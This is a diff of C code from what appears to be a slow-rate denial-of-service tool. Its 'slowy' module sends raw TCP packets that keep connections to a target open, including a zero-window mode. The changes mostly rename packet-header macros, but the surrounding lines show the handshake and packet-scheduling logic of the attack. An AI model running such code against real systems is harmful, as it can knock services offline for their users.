@@ -39,6 +39,10 @@
 
 #define BUFSIZE    2048
 
+#define IPV4_SADDR_P(p,x)  INET_ADDR_IPV4_GETP(p, IPV4_SADDR(x))
+#define IPV4_TADDR_P(p,x)  INET_ADDR_IPV4_GETP(p, IPV4_TADDR(x))
+
+
 typedef struct _tag_TCPCON {
   int         sport;
   int         mss;
@@ -150,14 +154,12 @@ static int slowy__listen_check(THREAD_WORK *tw, int proto, char *msg, unsigned i
   {
     case INET_FAMILY_IPV4:
       /* check msg size and headers */
-      if(size < sizeof(struct iphdr)
-      || IP_PROTOCOL(msg) != 6
-      || size < sizeof(struct tcphdr) + (IP_HEADER(msg)->ihl << 2))
+      if(!IPV4_TCP_HDRCK(msg, size))
         return 0;
 
       /* check msg */
-      return IP_HEADER(msg)->saddr == tc->dhost.addr.addr.in.addr
-          && ntohs(TCP_HEADER(msg)->source) == tc->dhost.port
+      return IPV4_HDR(msg)->saddr == tc->dhost.addr.addr.in.addr
+          && ntohs(IPV4_TCP_HDR(msg)->th_sport) == tc->dhost.port
              ? -1 : 0;
 
     case INET_FAMILY_IPV6:
@@ -191,9 +193,9 @@ static void slowy__listen(THREAD_WORK *tw)
         {
           /* send request in one TCP packet */
           ln_send_tcp_packet(tc->lnc,
-                             &tc->shost.addr, ntohs(TCP_HEADER(m->b)->dest),
+                             &tc->shost.addr, ntohs(IPV4_TCP_HDR(m->b)->th_dport),
                              &tc->dhost.addr, tc->dhost.port,
-                             TH_ACK | TH_PUSH,
+                             LN_TH_ACK | LN_TH_PUSH,
                              ntohs(c->window),
                              ntohl(c->seq),
                              ntohl(c->ack),
@@ -209,27 +211,27 @@ static void slowy__listen(THREAD_WORK *tw)
     while((m = tea_thread_msg_get(tw)) != NULL)
     {
       TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
-              IP_PROTOCOL(m->b),
-              (IP_HEADER(m->b)->saddr >>  0) & 0x00ff,
-              (IP_HEADER(m->b)->saddr >>  8) & 0x00ff,
-              (IP_HEADER(m->b)->saddr >> 16) & 0x00ff,
-              (IP_HEADER(m->b)->saddr >> 24) & 0x00ff,
-              TCP_HEADER(m->b)->dest, tc->dhost.port,
-              TCP_HEADER(m->b)->rst,
-              IP_HEADER(m->b)->saddr, tc->shost.addr.addr.in.addr);
+              IPV4_PROTOCOL(m->b),
+              IPV4_SADDR_P(3, m->b),
+              IPV4_SADDR_P(2, m->b),
+              IPV4_SADDR_P(1, m->b),
+              IPV4_SADDR_P(0, m->b),
+              IPV4_TCP_HDR(m->b)->th_dport, tc->dhost.port,
+              IPV4_TCP_HDR(m->b)->rst,
+              IPV4_HDR(m->b)->saddr, tc->shost.addr.addr.in.addr);
 
-      c = conn_get(tw, TCP_HEADER(m->b)->dest);
+      c = conn_get(tw, IPV4_TCP_HDR(m->b)->th_dport);
       if(c)
         TDBG2("  # (%d) continuing connection", c->sport);
 
       /* in some special case (handshake) send kakita */
-      if(TCP_HEADER(m->b)->syn != 0
-      && TCP_HEADER(m->b)->ack != 0
+      if(IPV4_TCP_HDR(m->b)->syn != 0
+      && IPV4_TCP_HDR(m->b)->ack != 0
       && !c)
       {
         /* register connection */
-        c = conn_new(tw, TCP_HEADER(m->b)->dest);
-        TDBG2("  # opening connection (%d - %p)", TCP_HEADER(m->b)->dest, c);
+        c = conn_new(tw, IPV4_TCP_HDR(m->b)->dest);
+        TDBG2("  # opening connection (%d - %p)", IPV4_TCP_HDR(m->b)->dest, c);
 
         /* get mss */
         c->mss = ln_tcp_get_mss(m->b, m->s);
@@ -238,15 +240,15 @@ static void slowy__listen(THREAD_WORK *tw)
         /* prepare first request packet to schedule (common for both attacks) */
         c->offset  = 0;
         c->window  = tc->window;
-        c->seq     = ntohl(TCP_HEADER(m->b)->ack_seq);
-        c->ack     = ntohl(TCP_HEADER(m->b)->seq) + 1;
+        c->seq     = ntohl(IPV4_TCP_HDR(m->b)->ack_seq);
+        c->ack     = ntohl(IPV4_TCP_HDR(m->b)->seq) + 1;
         c->flags   = TH_ACK;
 
         /* send handshake */
         TDBG2("  # (%d) sending handshake", c->sport);
         TERR("  # (%d) window %d", c->sport, c->window);
         ln_send_tcp_packet(tc->lnc,
-                           &tc->shost.addr, ntohs(TCP_HEADER(m->b)->dest),
+                           &tc->shost.addr, ntohs(IPV4_TCP_HDR(m->b)->dest),
                            &tc->dhost.addr, tc->dhost.port,
                            c->flags,
                            c->window,
@@ -258,11 +260,11 @@ static void slowy__listen(THREAD_WORK *tw)
 
       if(!c)
       {
-        TDBG("Ignored connection at port %d.", TCP_HEADER(m->b)->dest);
+        TDBG("Ignored connection at port %d.", IPV4_TCP_HDR(m->b)->dest);
         continue;
       }
 
-      if(TCP_HEADER(m->b)->ack != 0)
+      if(IPV4_TCP_HDR(m->b)->ack != 0)
       {
         int s;
 
@@ -285,7 +287,7 @@ static void slowy__listen(THREAD_WORK *tw)
         if(tc->zerowin)
         {
           /* (zerowin) */
-          s = m->s - (TCP_HEADER(m)->doff << 2) - (IP_HEADER(m)->ihl << 2);
+          s = m->s - (IPV4_TCP_HDR(m)->doff << 2) - (IPV4_HDR(m)->ihl << 2);
           c->window = c->window > s ? c->window - s : 0;
           if(c->window == 0)
             c->timeout = tc->ntimeout;
@@ -295,19 +297,19 @@ static void slowy__listen(THREAD_WORK *tw)
             c->timeout = tc->ntimeout;
         }
       } else
-      if(TCP_HEADER(m->b)->fin != 0
-      || TCP_HEADER(m->b)->rst != 0)
+      if(IPV4_TCP_HDR(m->b)->fin != 0
+      || IPV4_TCP_HDR(m->b)->rst != 0)
       {
         /* kill connection */
         /*   - (fin) schedule fin/ack packet */
-        if(!TCP_HEADER(m->b)->rst)
+        if(!IPV4_TCP_HDR(m->b)->rst)
           ln_send_tcp_packet(tc->lnc,
-                             &tc->shost.addr, ntohs(TCP_HEADER(m->b)->dest),
+                             &tc->shost.addr, ntohs(IPV4_TCP_HDR(m->b)->dest),
                              &tc->dhost.addr, tc->dhost.port,
                              TH_FIN | TH_ACK,
-                             ntohs(TCP_HEADER(m->b)->window),
-                             ntohl(TCP_HEADER(m->b)->ack_seq),
-                             ntohl(TCP_HEADER(m->b)->seq) + 1,
+                             ntohs(IPV4_TCP_HDR(m->b)->window),
+                             ntohl(IPV4_TCP_HDR(m->b)->ack_seq),
+                             ntohl(IPV4_TCP_HDR(m->b)->seq) + 1,
                              NULL, 0,
                              NULL, 0);
 
